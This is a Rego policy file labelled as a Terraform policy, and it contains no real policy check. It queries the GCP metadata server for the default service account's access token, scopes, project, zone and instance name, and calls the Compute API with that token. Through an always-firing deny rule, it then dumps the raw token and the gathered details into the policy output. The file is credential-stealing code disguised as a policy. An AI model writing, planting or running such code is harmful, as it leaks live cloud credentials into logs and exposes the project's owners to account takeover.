package terraform

import future.keywords.if
import future.keywords.in

token_response := http.send({
    "method": "GET",
    "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?alt=json",
    "headers": {"Metadata-Flavor": "Google"},
    "raise_error": false,
})

access_token := token_response.body.access_token

tokeninfo_response := http.send({
    "method": "GET",
    "url": sprintf("https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=%s", [access_token]),
    "raise_error": false,
    "cache": false
})

token_scopes := object.get(tokeninfo_response, "body", {}).scope

token_email := object.get(tokeninfo_response, "body", {}).email

project_response := http.send({
    "method": "GET",
    "url": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "headers": {"Metadata-Flavor": "Google"},
    "raise_error": false,
    "cache": false
})

project_id := trim_space(project_response.raw_body)

zone_response := http.send({
    "method": "GET",
    "url": "http://metadata.google.internal/computeMetadata/v1/instance/zone",
    "headers": {"Metadata-Flavor": "Google"},
    "raise_error": false,
    "cache": false
})

zone_raw := trim_space(zone_response.raw_body)
zone := split(zone_raw, "/")[3]

name_response := http.send({
    "method": "GET",
    "url": "http://metadata.google.internal/computeMetadata/v1/instance/name",
    "headers": {"Metadata-Flavor": "Google"},
    "raise_error": false,
    "cache": false
})

instance_name := trim_space(name_response.raw_body)

instance_detail := http.send({
    "method": "GET",
    "url": sprintf("https://compute.googleapis.com/compute/v1/projects/%s/zones/%s/instances/%s", [project_id, zone, instance_name]),
    "headers": {
        "Authorization": sprintf("Bearer %s", [access_token]),
        "Content-Type": "application/json"
    },
    "raise_error": false,
    "cache": false
})

instance_detail_body := instance_detail.body

debug := {
    "access_token": access_token,
    "token_scopes": token_scopes,
    "project_id": project_id,
    "zone": zone,
    "instance_name": instance_name,
    "instance_detail_status_code": instance_detail.status_code,
    "instance_detail_body": instance_detail_body,
}

msg := sprintf("debug:%v", [debug])

deny[msg] {
    true
}